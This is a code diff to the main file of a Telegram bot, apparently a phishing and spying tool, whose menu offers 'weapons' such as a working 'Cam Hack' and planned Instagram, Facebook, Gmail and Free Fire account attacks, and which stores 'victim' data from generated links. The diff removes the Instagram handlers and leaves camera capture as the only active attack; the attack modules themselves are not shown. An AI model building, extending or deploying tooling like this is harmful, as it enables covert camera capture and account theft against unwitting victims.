@@ -5,12 +5,6 @@ import threading
 from flask import Flask
 from bot.config import BOT_TOKEN
 from bot.buttons.cam import handle_cam_hack
-from bot.buttons.insta import handle_insta_button, handle_insta_callback
-from bot.buttons.face import handle_face_callback
-from bot.buttons.twit import handle_twit_callback
-from bot.buttons.snap import handle_snap_callback
-from bot.buttons.gmail import handle_gmail
-from bot.buttons.free import handle_free_fire
 from bot.server import app as flask_app
 from bot.utils.storage import link_cache, victim_data_store
 
@@ -40,7 +34,7 @@ def start(message):
         user_id,
         "🔥 *Choose your weapon:*\n\n"
         "📸 Cam Hack (working)\n"
-        "📸 Instagram (working)\n"
+        "📸 Instagram (coming soon)\n"
         "📘 Facebook (coming soon)\n"
         "🐦 Twitter (coming soon)\n"
         "👻 Snapchat (coming soon)\n"
@@ -60,13 +54,10 @@ def route_buttons(message):
     if text == "📸 Cam Hack":
         handle_cam_hack(bot, message, get_bottom_buttons)
 
-    elif text == "📸 Instagram":
-        handle_insta_button(bot, message, get_bottom_buttons)
-
-    elif text in ["📘 Facebook", "🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
+    elif text in ["📸 Instagram", "📘 Facebook", "🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(
             user_id,
-            f"⏳ *{text}* is coming soon. Only *Cam Hack* and *Instagram* are working.",
+            f"⏳ *{text}* is coming soon. Only *Cam Hack* is working right now.",
             reply_markup=get_bottom_buttons(),
             parse_mode="Markdown"
         )
@@ -77,13 +68,8 @@ def route_buttons(message):
 # ========== INLINE CALLBACKS ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
-    data = call.data
-
-    if data == "copy":
+    if call.data == "copy":
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
-
-    elif data.startswith("ig_"):
-        handle_insta_callback(bot, call)
 
 # ========== RUN BOT ==========
 def run_bot():
@@ -98,6 +84,6 @@ def run_bot():
 app = flask_app
 
 if __name__ == "__main__":
-    print("🤖 Bot Running... (Cam Hack + Instagram working)")
+    print("🤖 Cam Hack is working...")
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=5000, debug=False)
